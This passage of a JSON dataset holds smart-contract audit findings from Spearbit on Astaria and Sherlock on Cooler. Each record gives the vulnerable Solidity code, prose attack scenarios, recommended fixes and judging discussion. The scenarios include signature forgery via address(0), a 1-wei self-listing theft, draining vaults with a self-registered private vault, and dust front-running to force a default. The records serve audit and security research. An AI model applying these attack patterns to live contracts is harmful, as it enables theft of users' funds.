        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7284",
      "title": "Phony signatures can be used to forge any strategy",
      "impact": "HIGH",
      "content": "## Security Report\n\n## Severity\n**Critical Risk**\n\n## Context\n`VaultImplementation.sol#L249`\n\n## Description\nIn `in_validateCommitment()`, we check that the merkle root of the strategy has been signed by the strategist or delegate. After the signer is recovered, the following check is performed to validate the signature:\n\n```plaintext\nrecovered != owner() && recovered != s.delegate && recovered != address(0)\n```\n\nThis check seems to be miswritten, so that any time `recovered == address(0)`, the check passes. Whenever `ecrecover` is used to check the signed data, it returns `address(0)` in the situation that a phony signature is submitted. \n\nSee this example for how this can be done. The result is that any borrower can pass in any merkle root they'd like, sign it in a way that causes `address(0)` to return from `ecrecover`, and have their commitment validated.\n\n## Recommendation\nModify the check to:\n\n```plaintext\nif (\n- recovered != owner() && recovered != s.delegate && recovered != address(0)\n+ (recovered != owner() && recovered != s.delegate) || recovered == address(0)\n) {\n    revert IVaultImplementation.InvalidRequest(\n        InvalidRequestReason.INVALID_SIGNATURE\n    );\n}\n```\n\n## Acknowledgements\n- **Astaria**: Fixed in PR 209.\n- **Spearbit**: Verified.",
      "summary": "\nThis bug report is about a critical risk found in the VaultImplementation.sol#L249 of the code. The bug is related to the check performed to validate the signature in the In_validateCommitment() function. The check was miswritten, which allows any borrower to pass in any merkle root they'd like and sign it in a way that causes address(0) to return from ecrecover, and have their commitment validated. This can be done by submitting a phony signature. \n\nThe recommendation to fix the bug is to change the check from recovered != owner() && recovered != s.delegate && recovered != address(0) to (recovered != owner() && recovered != s.delegate) || recovered == address(0). This was fixed in PR 209 and verified by Spearbit.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Validation",
        "Merkle Tree"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7283",
      "title": "A borrower can list their collateral on Seaport and receive almost all the listing price without paying back their liens",
      "impact": "HIGH",
      "content": "## Severity: Critical Risk\n\n## Context\n**File:** LienToken.sol#L480\n\n## Description\nWhen the collateral is listed on SeaPort by the borrower using `listForSaleOnSeaport`, `s.auctionData` is not populated. Thus, if that order gets fulfilled/matched and `ClearingHouse`'s fallback function gets called since `stack.length` is 0, this loop will not run and no payment is sent to the lending vaults. The rest of the payment is sent to the borrower. The collateral token and its related data get burnt/deleted by calling `settleAuction`. The lien tokens and the vaults remain untouched as though nothing has happened. \n\nSo basically, a borrower can:\n1. Take/borrow liens by offering collateral.\n2. List their collateral on SeaPort through the `listForSaleOnSeaport` endpoint.\n3. Once/if the SeaPort order fulfills/matches, the borrower would be paid the listing price minus the amount sent to the liquidator (`address(0)` in this case, which should be corrected).\n4. Collateral token/data gets burnt/deleted.\n5. Lien token data remains, and the loans are not paid back to the vaults.\n\nAs a result, the borrower could end up with all the loans they have taken plus the listing price from the SeaPort order. \n\nNote that when a user lists their own collateral on SeaPort, it seems that we intentionally do not kick off the auction process:\n- Liens are continued.\n- Collateral state hash is unchanged.\n- Liquidator isn't set.\n- Vaults aren't updated.\n- Withdraw proxies aren't set, etc.\n\n## Related Issue\nIssue #88\n\n## Recommendation\nBe careful and pay attention that listing by a borrower versus auctioning by a liquidator takes separate return/payback paths. It is recommended to separate the listing and liquidating logic and ensure auction funds are distributed appropriately. Most importantly, the auction stack must be set.\n\n## Astaria\nWe've removed the ability for self-listing on SeaPort as the fix for v0 and will add this feature in a future release.\n\n## Spearbit\nFixed in the following PR by removing the `listForSaleOnSeaport` endpoint (PR 206).",
      "summary": "\nThis bug report is about a critical risk in the LienToken.sol code. When the collateral is listed on SeaPort by the borrower using listForSaleOnSeaport, the payment is sent to the borrower instead of the lending vaults. This means that the borrower can take/borrow liens by offering a collateral, list it on SeaPort, and keep the listing price minus the amount sent to the liquidator, without paying back the liens to the vaults. To fix this, the listing and liquidating logic was separated and the auction stack was set. The listForSaleOnSeaport endpoint was also removed as a fix.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7282",
      "title": "validateStack allows any stack to be used with collateral with no liens",
      "impact": "HIGH",
      "content": "## Severity: Critical Risk\n\n## Context\nLienToken.sol#L225-232\n\n## Description\nThe `validateStack` modifier is used to confirm that a stack entered by a user matches the `stateHash` in storage. However, the function reverts under the following conditions:\n\n```solidity\nif (stateHash != bytes32(0) && keccak256(abi.encode(stack)) != stateHash) {\n    revert InvalidState(InvalidStates.INVALID_HASH);\n}\n```\n\nThe result is that any collateral with `stateHash == bytes32(0)` (which is all collateral without any liens taken against it yet) will accept any provided stack as valid. This can be used in a number of harmful ways. Examples of vulnerable endpoints are:\n\n- **createLien**: If we create the first lien but pass a stack with other liens, those liens will automatically be included in the stack going forward, which means that the collateral holder will owe money they didn't receive.\n  \n- **makePayment**: If we make a payment on behalf of a collateral with no liens, but include a stack with many liens (all owed to me), the result will be that the collateral will be left with the remaining liens continuing to be owed.\n  \n- **buyoutLien**: Anyone can call `buyoutLien(...)` and provide parameters that are spoofed but satisfy some constraints so that the call would not revert. This is currently possible due to the issue in this context. As a consequence, the caller can:\n    - _mint any unminted liens which can DoS the system.\n    - _burn lienIds that they don't have the right to remove.\n    - manipulate any public vault's storage (if it has been set as a payee for a lien) through its `handleBuyoutLien`. It seems like this endpoint might have been meant to be a restricted endpoint that only registered vaults can call into. And the caller/user is supposed to only call into here from `VaultImplementation.buyoutLien`.\n\n## Recommendation\n```solidity\nmodifier validateStack(uint256 collateralId, Stack[] memory stack) {\n    LienStorage storage s = _loadLienStorageSlot();\n    bytes32 stateHash = s.collateralStateHash[collateralId];\n    \n    if (stateHash == bytes32(0) && stack.length != 0) {\n        revert InvalidState(InvalidStates.EMPTY_STATE);\n    }\n    \n    if (stateHash != bytes32(0) && keccak256(abi.encode(stack)) != stateHash) {\n        revert InvalidState(InvalidStates.INVALID_HASH);\n    }\n    _;\n}\n```\nThis will also require adding the `InvalidStates.EMPTY_STATE` to the enum.\n\n## Astaria\nPR 194.\n\n## Spearbit\nConfirmed that this is fixed in the following PR 194.",
      "summary": "\nA critical risk was discovered in the LienToken.sol#L225-232 code which affects the validateStack modifier. This modifier is used to confirm that a stack entered by a user matches the stateHash in storage. The code was found to revert under certain conditions, allowing any collateral with stateHash == bytes32(0) to accept any provided stack as valid. This could be exploited in a number of harmful ways, such as creating liens, making payments, or buying out liens.\n\nTo fix this issue, a new condition was added to the validateStack modifier to check if the stateHash is equal to bytes32(0) and the stack length is not equal to 0. If this is the case, the code will revert with the InvalidStates.EMPTY_STATE. Additionally, the InvalidStates.EMPTY_STATE was added to the enum. Astaria and Spearbit have confirmed that this fix has been implemented in PR 194.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Validation"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7281",
      "title": "Collateral owner can steal funds by taking liens while asset is listed for sale on Seaport",
      "impact": "HIGH",
      "content": "## Severity: Critical Risk\n\n## Context\nLienToken.sol#L368-372\n\n## Description\nWe only allow collateral holders to call `listForSaleOnSeaport` if they are listing the collateral at a price that is sufficient to pay back all of the liens on their collateral. \n\nWhen a new lien is created, we check that `collateralStateHash != bytes32(\"ACTIVE_AUCTION\")` to ensure that the collateral is able to accept a new lien. However, calling `listForSaleOnSeaport` does not set the `collateralStateHash`, so it doesn't stop us from taking new liens. \n\nAs a result, a user can deposit collateral and then, in one transaction:\n- List the asset for sale on Seaport for 1 wei.\n- Take the maximum possible loans against the asset.\n- Buy the asset on Seaport for 1 wei.\n\nThe 1 wei will not be sufficient to pay back the lenders, and the user will be left with the collateral as well as the loans (minus 1 wei).\n\n## Recommendation\nEither set the `collateralStateHash` when an item is listed for sale on Seaport, or check the `s.collateralIdToAuction` variable before allowing a lien to be taken.\n\n## Astaria\n`listForSaleOnSeaport` has been removed in the following PR and that resolves the issue PR 206.\n\n## Spearbit\nVerified.",
      "summary": "\nThis bug report highlights an issue with the LienToken.sol code which allows a user to deposit collateral, list it for sale on Seaport for 1 wei, take the maximum possible loans against the asset, and then buy the asset back on Seaport for 1 wei. This leaves the user with the collateral as well as the loans, minus 1 wei, and does not provide enough funds to pay back the lenders. The recommendation is to either set the collateralStateHash when an item is listed for sale on Seaport, or check the s.collateralIdToAuction variable before allowing a lien to be taken. This issue has since been resolved in PR 206.9, in which listForSaleOnSeaport was removed. This fix has been verified.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Business Logic",
        "Validation"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7280",
      "title": "Anyone can take a valid commitment combined with a self-registered private vault to steal funds from any vault without owning any collateral",
      "impact": "HIGH",
      "content": "## Severity: Critical Risk\n\n## Context\n- `VaultImplementation.sol#L279`\n- `VaultImplementation.sol#L227`\n\n## Description\nThe issue stems from the following check in `VaultImplementation._validateCommitment(params, receiver)`:\n\n```solidity\nif (\n    msg.sender != holder &&\n    receiver != holder &&\n    receiver != operator &&\n    !ROUTER().isValidVault(receiver) // <-- the problematic condition\n) {\n    ...\n}\n```\n\nIn this `if` block, if `receiver` is a valid vault, the body of the `if` is skipped. A valid vault is one that has been registered in `AstariaRouter` using `newVault` or `newPublicVault`. So for example, any supplied private vault as a receiver would be allowed here and the call to `_validateCommitment` will continue without reverting, at least in this `if` block.\n\nIf we backtrack function calls to `_validateCommitment`, we arrive at three exposed endpoints:\n- `commitToLiens`\n- `buyoutLien`\n- `commitToLien`\n\nA call to `commitToLiens` will end up having the receiver be the `AstariaRouter`. A call to `buyoutLien` will set the receiver as the `recipient()` for the vault, which is either the vault itself for public vaults or the owner for private vaults. So, we are only left with `commitToLien`, where the caller can set the value for the receiver directly.\n\nA call to `commitToLien` will initiate a series of function calls, and so the `receiver` is only supplied to `_validateCommitment` to check whether it is allowed to be used, and finally when transferring (`safeTransfer`) wETH. \n\nThis opens up exploiting scenarios where an attacker:\n1. Creates a new private vault by calling `newVault`, let's call it `V`.\n2. Takes a valid commitment `C` and combines it with `V` and supplies those to `commitToLien`.\n3. Calls the `withdraw` endpoint of `V` to withdraw all the funds.\n\nFor step 2, the attacker can source valid commitments by doing either of the following:\n1. Frontrun calls to `commitToLiens` and take all the commitments `C0, C1, ..., Cn` and supply them one by one along with `V` to `commitToLien` endpoint of the vault that was specified by each `Ci`.\n2. Frontrun calls to `commitToLien` endpoints of vaults, take their commitment `C` and combine it with `V` to send to `commitToLien`.\n3. Backrun either scenario from the above points and create a new commitment with a new lien request that tries to max out the potential debt for collateral while also keeping other inequalities valid (for example, the inequality regarding `liquidationInitialAsk`).\n\n## Recommendation\nIf the `commitToLien` endpoint is only supposed to be called by `AstariaRouter`, make sure to apply that restriction.\n\nOr if it is allowed to be called by anyone, the `!ROUTER().isValidVault(receiver)` condition would need to be modified. As an example, one can use the `commitment.lienRequest.strategy.vault` (let's call it `Vs`) and make sure that when `ROUTER().isValidVault(receiver) === true`, then `R = Vs` (where `R` is the receiver; note some parameters might be redundant in this case).\n\nWe would also need to take into consideration that either the vault owner's or delegate's also signing `Vs` or the strategy validators would take this value into consideration when `validateAndParse` is called. This second recommendation might interfere with what `commitment.lienRequest.strategy.vault` would need to represent in other places (the vault that the amount is borrowed from, not sent to).",
      "summary": "\nThis bug report is about an issue in the VaultImplementation.sol code. The problem is that a valid vault can be used as a receiver without the need for collateral. This opens up exploiting scenarios where an attacker creates a private vault, takes a valid commitment, combines it with the private vault, and calls the withdraw endpoint to take all the funds. The attacker can source valid commitments by frontrunning calls to commitToLiens or commitToLien endpoints of vaults. \n\nTo fix this issue, the commitToLien endpoint should be restricted to only be called by AstariaRouter. Alternatively, the !ROUTER().isValidVault(receiver) condition should be modified. This would involve making sure that when ROUTER().isValidVault(receiver) is true, then R=Vs, where R is the receiver. Additionally, the vault owner or delegate would need to sign Vs, and the strategy validators would need to take this value into consideration when validateAndParse is called.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Don't update state"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7279",
      "title": "LienToken.transferFrom does not update a public vault's bookkeeping parameters when a lien is transferred to it.",
      "impact": "HIGH",
      "content": "## Severity: Critical Risk\n\n**Context:** `LienToken.sol#L303`\n\n**Description:**  \nWhen `transferFrom` is called, there is no check to determine whether the `from` or `to` parameters could be a public vault. Currently, there is no mechanism for public vaults to transfer their liens. However, private vault owners who also own the vault's lien tokens can call `transferFrom` and transfer their liens to a public vault. In this case, we need to ensure that we update the bookkeeping for the public vault that the lien was transferred to.\n\nOn the `LienToken` side, `s.LienMeta[id].payee` needs to be set to the address of the public vault. On the `PublicVault` side, `yIntercept`, `slope`, `last`, and `epochData` of `VaultData` need to be updated (this requires knowing the lien's end). However, private vaults do not keep a record of these values, and the corresponding values are only saved in stacks off-chain and validated on-chain using their hash.\n\n**Recommendation:**\n- Either block transferring liens to public vaults, or\n- Ensure that private vaults or the `LienToken` have more storage parameters to keep a record of certain values for each lien. This way, when the time comes to transfer a lien to a public vault, the parameters mentioned in the Description can be updated for the public vault.",
      "summary": "\nThis bug report is about the lack of a mechanism for public vaults to transfer liens when the transferFrom function is called. Currently, private vault owners who are also owners of the vault's lien tokens can call transferFrom and transfer their liens to a public vault. When this happens, the LienToken side needs to have the payee set to the address of the public vault, and the PublicVault side needs to update its VaultData parameters including yIntercept, slope, last, and epochData. This data is stored off-chain and validated on-chain using a hash.\n\nTwo possible solutions are proposed in the report: either to block transferring liens to public vaults or to have private vaults or the LienToken store more parameters that would keep a record of values for each lien so the data can be updated for the public vault when the lien is transferred.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Don't update state"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "6286",
      "title": "M-5: DAI/gOHM exchange rate may be stale",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-01-cooler-judging/issues/217 \n\n## Found by \nIllIllI\n\n## Summary\n\nThe `maxLTC` variable is a constant which implies a specific DAI/gOHM echange rate. The exchange rate has already changed so the current value in use will be wrong, and any value chosen now will eventually be out of date.\n\n\n## Vulnerability Detail\n\nThe `ClearingHouse` allows any loan to go through (assuming the `operator` approves it, and the `operator` is likely some sort of keeper program), and decides whether the terms are fair based on the hard-coded `maxLTC`, which will be (and is already - gOHM is currently worth $2,600) out of date. \n\nIf the code had been using a Chainlink oracle, this issue would be equivalent to not checking whether the price used to determine the loan-to-collateral ratio was stale, which is a Medium-severity issue.\n\nIt's not clear who or what exactly will be in control of the `operator` address which will make the `clear()` calls, but it will likely be a keeper which, unless programmed otherwise, would blindly approve such loans. Even if the `operator` is an actual person, the fact that there are coded checks for the `maxLTC`, means that the person/keeper can't be fully trusted, or that the code is attempting to protect against mistakes, so this category of mistake should also be added.\n\n\n## Impact\n\nUnder-collateralized loans will be given, and borrowers will purposely take loans default, since they can use the loan amount to buy more collateral than they would lose during default.\n\n\n## Code Snippet\n\nThe maximum loan-to-collateral is hard-coded, rather than being based on an oracle price:\n```solidity\n// File: src/aux/ClearingHouse.sol : ClearingHouse.maxLTC   #1\n\n34:@>     uint256 public constant maxLTC = 2_500 * 1e18; // 2,500\n```\nhttps://github.com/sherlock-audit/2023-01-cooler/blob/main/src/aux/ClearingHouse.sol#L34\n\nIf the gOHM price drops below $2500 to say $2000, a loan for 2500 DAI will only require 1 gOHM of collateral, even though it should require at least 1.2 gOHM in order to be fully-collateralized:\n```solidity\n// File: src/Cooler.sol : Cooler.collateralFor()   #2\n\n236        function collateralFor(uint256 amount, uint256 loanToCollateral) public pure returns (uint256) {\n237 @>         return amount * decimals / loanToCollateral;\n238:       }\n```\nhttps://github.com/sherlock-audit/2023-01-cooler/blob/main/src/Cooler.sol#L236-L238\n\n\n## Tool used\n\nManual Review\n\n\n## Recommendation\n\nUse a chainlink oracle to determine the right prices to use when coming up with the maximum loan-to-collateral, for _each_ loan\n\n\n## Discussion\n\n**hrishibhat**\n\nSponsor comment:\n> Not intended to be updated in real time. Set via gov; computed relative to backing (far less volatile than pricing).\n\n**IllIllI000**\n\nThe values are stored in `constant` variables, so once they're set they cannot change\n\n**hrishibhat**\n\nConsidering this issue as a valid medium, as a request placed with an ltc based on the exchange rate would result in incorrect maxltc calculated. Could render the contract useless since the maxLTC is fixed. \n\n> If the gOHM price drops below $2500 to say $2000, a loan for 2500 DAI will only require 1 gOHM of collateral, even though it should require at least 1.2 gOHM in order to be fully-collateralized:\n\n**0x00052**\n\nEscalate for 11 USDC\n\n`If the gOHM price drops below $2500 to say $2000, a loan for 2500 DAI will only require 1 gOHM of collateral, even though it should require at least 1.2 gOHM in order to be fully-collateralized:`\n\nI disagree with this statement. It doesn't use the maxLTC when creating the loan, it uses the value specified by the loan request. maxLTC is just the max value it can't exceed. There's nothing forcing the operator to accept every loan at/under the maxLTC. The operator would have discretion and wouldn't clear bad loans that are undercollateralized from the start. The only thing it's doing it providing a hard stop for the ltc.\n\n        (\n            uint256 amount, \n            uint256 interest, \n            uint256 ltc, \n            uint256 duration,\n        ) = cooler.requests(id);\n\n\n        // Validate terms\n        if (interest < minimumInterest) \n            revert InterestMinimum();\n        if (ltc > maxLTC) \n            revert LTCMaximum();\n\nWe see in the above lines that it pulls the requested LTC from the cooler and compares it to maxLTC to confirm it isn't too high. It doesn't use the maxLTC value, it simply functions as a guardrail to make sure it doesn't accidentally clear a bad loan to gives way too much DAI. Technically if the price of gOHM was to increase dramatically the contract would become useless, but it wouldn't lead to any lost/stuck funds and it would be easy enough to just deploy a new contract with different bounds.\n\nThis should be low severity.\n\n**sherlock-admin**\n\n > Escalate for 11 USDC\n> \n> `If the gOHM price drops below $2500 to say $2000, a loan for 2500 DAI will only require 1 gOHM of collateral, even though it should require at least 1.2 gOHM in order to be fully-collateralized:`\n> \n> I disagree with this statement. It doesn't use the maxLTC when creating the loan, it uses the value specified by the loan request. maxLTC is just the max value it can't exceed. There's nothing forcing the operator to accept every loan at/under the maxLTC. The operator would have discretion and wouldn't clear bad loans that are undercollateralized from the start. The only thing it's doing it providing a hard stop for the ltc.\n> \n>         (\n>             uint256 amount, \n>             uint256 interest, \n>             uint256 ltc, \n>             uint256 duration,\n>         ) = cooler.requests(id);\n> \n> \n>         // Validate terms\n>         if (interest < minimumInterest) \n>             revert InterestMinimum();\n>         if (ltc > maxLTC) \n>             revert LTCMaximum();\n> \n> We see in the above lines that it pulls the requested LTC from the cooler and compares it to maxLTC to confirm it isn't too high. It doesn't use the maxLTC value, it simply functions as a guardrail to make sure it doesn't accidentally clear a bad loan to gives way too much DAI. Technically if the price of gOHM was to increase dramatically the contract would become useless, but it wouldn't lead to any lost/stuck funds and it would be easy enough to just deploy a new contract with different bounds.\n> \n> This should be low severity.\n\nYou've created a valid escalation for 11 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**hrishibhat**\n\nEscalation rejected\n\nAfter careful consideration & internal discussion. Sherlock did not have full context on the intent of the contract. Based on certain assumptions, & as pointed out by the escalation,\nin case of price change, the contract does not seem to serve its purpose and is rendered useless with the same bounds, making this issue a valid medium. \n\n**sherlock-admin**\n\n> Escalation rejected\n> \n> After careful consideration & internal discussion. Sherlock did not have full context on the intent of the contract. Based on certain assumptions, & as pointed out by the escalation,\n> in case of price change, the contract does not seem to serve its purpose and is rendered useless with the same bounds, making this issue a valid medium. \n\nThis issue's escalations have been rejected!\n\nWatsons who escalated this issue will have their escalation amount deducted from their next payout.",
      "summary": "\nThis bug report is about an issue (M-5) found in the code of the \"2023-01-cooler-judging\" project on GitHub. The issue involves the DAI/gOHM exchange rate, which is currently hard-coded in the code and could become stale. This could lead to under-collateralized loans being given, and borrowers taking advantage of this by purposely defaulting on their loans.\n\nThe issue was found manually by IllIllI000, and the code snippet shows that the maximum loan-to-collateral is hard-coded, rather than being based on an oracle price. This means that if the gOHM price drops below the hard-coded value, a loan for 2500 DAI will only require 1 gOHM of collateral, even though it should require at least 1.2 gOHM in order to be fully-collateralized.\n\nThe impact of this issue is that under-collateralized loans will be given, and borrowers will purposely take loans and default, since they can use the loan amount to buy more collateral than they would lose during default.\n\nThe recommendation is to use a chainlink oracle to determine the right prices to use when coming up with the maximum loan-to-collateral, for each loan. This was initially escalated for 11 USDC, but it was rejected after careful consideration and internal discussion.",
      "quality_score": 3,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Cooler",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-cooler-judging/issues/217",
      "tags": [
        "Stale Price"
      ],
      "finders": [
        "IllIllI"
      ]
    },
    {
      "id": "6285",
      "title": "M-4: Dust amounts can cause payments to fail, leading to default",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-01-cooler-judging/issues/218 \n\n## Found by \nkiki\\_dev, HollaDieWaldfee, IllIllI, ak1\n\n## Summary\n\nDust amounts can cause payments to fail, leading to default\n\n\n## Vulnerability Detail\n\nIn order for a loan to close, the exact right number of wei of the debt token must be sent to match the remaining loan amount. If more is sent, the balance underflows, reverting the transaction.\n\n\n## Impact\n\nAn attacker can send dust amounts right before a loan is due, front-running any payments also destined for the final block before default. If the attacker's transaction goes in first, the borrower will be unable to pay back the loan before default, and will lose thier remaining collateral. This may be the whole loan amount.\n\n\n## Code Snippet\n\nIf the repayment amount isn't exactly the remaining loan amount, and instead is more (due to the dust payment), the subtraction marked below will underflow, reverting the payment:\n```solidity\n// File: src/Cooler.sol : Cooler.repay()   #1\n\n108        function repay (uint256 loanID, uint256 repaid) external {\n109            Loan storage loan = loans[loanID];\n110    \n111            if (block.timestamp > loan.expiry) \n112                revert Default();\n113            \n114            uint256 decollateralized = loan.collateral * repaid / loan.amount;\n115    \n116           if (repaid == loan.amount) delete loans[loanID];\n117           else {\n118 @>             loan.amount -= repaid;\n119                loan.collateral -= decollateralized;\n120            }\n121    \n122            debt.transferFrom(msg.sender, loan.lender, repaid);\n123            collateral.transfer(owner, decollateralized);\n124:       }\n```\nhttps://github.com/sherlock-audit/2023-01-cooler/blob/main/src/Cooler.sol#L108-L124\n\n\n## Tool used\n\nManual Review\n\n\n## Recommendation\n\nOnly collect and subtract the minimum of the current loan balance, and the amount specified in the `repaid` variable\n\n\n## Discussion\n\n**hrishibhat**\n\nSponsor comment:\n> Good spot. Niche case.",
      "summary": "\nThis bug report is about an issue found in the code of the Cooler.sol file of the Sherlock Audit project. The issue is that when a loan is due, if a dust amount is sent, the balance underflows and the transaction reverts, leading to default. This means that an attacker can send a dust amount right before the loan is due, front-running any payments also destined for the final block before default. If the attacker's transaction goes in first, the borrower will be unable to pay back the loan before default, and will lose their remaining collateral.\n\nThe bug was found by kiki_dev, HollaDieWaldfee, IllIllI, and ak1, and was identified using manual review. The recommendation is to only collect and subtract the minimum of the current loan balance and the amount specified in the repaid variable. Hrishibhat commented that it was a good spot. The sponsor commented that it was a niche case.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Cooler",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-cooler-judging/issues/218",
      "tags": [
        "Dust",
        "Revert By Sending Dust",
        "Front-Running",
        "Business Logic"
      ],
      "finders": [
        "IllIllI",
        "HollaDieWaldfee",
        "kiki\\_dev",
        "ak1"
      ]
    },
    {
      "id": "6284",
      "title": "M-3: Repaying loans with small amounts of debt tokens can lead to underflowing in the `roll` function",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-01-cooler-judging/issues/263 \n\n## Found by \ntsvetanovv, rvierdiiev, ck, zaskoh, Allarious, Trumpero, Breeje, berndartmueller, jonatascm, Deivitto\n\n## Summary\n\nDue to precision issues when repaying a loan with small amounts of debt tokens, the `loan.amount` can be reduced whereas the `loan.collateral` remains unchanged. This can lead to underflowing in the `roll` function.\n\n## Vulnerability Detail\n\nThe `decollateralized` calculation in the `repay` function rounds down to zero if the `repaid` amount is small enough. This allows iteratively repaying a loan with very small amounts of debt tokens without reducing the collateral.\n\nThe consequence is that the `roll` function can revert due to underflowing the `newCollateral` calculation once the `loan.collateral` is greater than `collateralFor(loan.amount, req.loanToCollateral)` (`loan.amount` is reduced by repaying the loan)\n\nAs any ERC-20 tokens with different decimals can be used, this precision issue is amplified if the decimals of the collateral and debt tokens differ greatly.\n\n## Impact\n\nThe `roll` function can revert due to underflowing the `newCollateral` calculation if the `repay` function is (iteratively) called with small amounts of debt tokens.\n\n## Code Snippet\n\n[Cooler.sol#L114](https://github.com/sherlock-audit/2023-01-cooler/blob/main/src/Cooler.sol#L114)\n\n```solidity\nfunction repay (uint256 loanID, uint256 repaid) external {\n    Loan storage loan = loans[loanID];\n\n    if (block.timestamp > loan.expiry)\n        revert Default();\n\n    uint256 decollateralized = loan.collateral * repaid / loan.amount; // @audit-info (10e18 * 10) / 1_000e18 = 0 (rounds down due to imprecision)\n\n    if (repaid == loan.amount) delete loans[loanID];\n    else {\n        loan.amount -= repaid;\n        loan.collateral -= decollateralized;\n    }\n\n    debt.transferFrom(msg.sender, loan.lender, repaid);\n    collateral.transfer(owner, decollateralized);\n}\n```\n\n[Cooler.sol#L139](https://github.com/sherlock-audit/2023-01-cooler/blob/main/src/Cooler.sol#L139)\n\nCalculating `newCollateral` in L139 can potentially revert due to underflowing if `loan.collateral` is greater than the required collateral (`collateralFor(loan.amount, req.loanToCollateral) `).\n\nA malicious user can use the imprecision issue in the `repay` function in L114 to repay small amounts of debt tokens (`loan.collateral * repaid` < `loan.amount`), which leads to no reduction of loan collateral, whereas the `loan.amount` is reduced.\n\nThis will prevent the `roll` function from being called.\n\n```solidity\nfunction roll (uint256 loanID) external {\n    Loan storage loan = loans[loanID];\n    Request memory req = loan.request;\n\n    if (block.timestamp > loan.expiry)\n        revert Default();\n\n    if (!loan.rollable)\n        revert NotRollable();\n\n    uint256 newCollateral = collateralFor(loan.amount, req.loanToCollateral) - loan.collateral;\n    uint256 newDebt = interestFor(loan.amount, req.interest, req.duration);\n\n    loan.amount += newDebt;\n    loan.expiry += req.duration;\n    loan.collateral += newCollateral;\n\n    collateral.transferFrom(msg.sender, address(this), newCollateral);\n}\n```\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider preventing the loan from being repaid if the amount of returned collateral tokens is zero (i.e., `decollateralized == 0`).\n\n## Discussion\n\n**hrishibhat**\n\nSponsor comment:\n\n> Good Spot.",
      "summary": "\nThis bug report is about an issue found in the `roll` function of the Cooler contract. The issue arises when repaying a loan with small amounts of debt tokens, which can lead to underflowing in the `roll` function. The `decollateralized` calculation in the `repay` function rounds down to zero if the `repaid` amount is small enough. This allows iteratively repaying a loan with very small amounts of debt tokens without reducing the collateral. The consequence is that the `roll` function can revert due to underflowing the `newCollateral` calculation once the `loan.collateral` is greater than `collateralFor(loan.amount, req.loanToCollateral)`. This precision issue is amplified if the decimals of the collateral and debt tokens differ greatly.\n\nThe impact is that the `roll` function can revert due to underflowing the `newCollateral` calculation if the `repay` function is (iteratively) called with small amounts of debt tokens. The recommendation is to consider preventing the loan from being repaid if the amount of returned collateral tokens is zero (i.e., `decollateralized == 0`). The bug was found by tsvetanovv, rvierdiiev, ck, zaskoh, Allarious, Trumpero, Breeje, berndartmueller, jonatascm, Deivitto and was manually reviewed.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Cooler",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-cooler-judging/issues/263",
      "tags": [
        "Missing Check",
        "Overflow/Underflow"
      ],
      "finders": [
        "Deivitto",
        "tsvetanovv",
        "berndartmueller",
        "ck",
        "Trumpero",
        "Breeje",
        "Allarious",
        "rvierdiiev",
        "jonatascm",
        "zaskoh"
      ]
    },
    {
      "id": "6283",
      "title": "M-2: Loan is rollable by default",
      "impact": "MEDIUM",
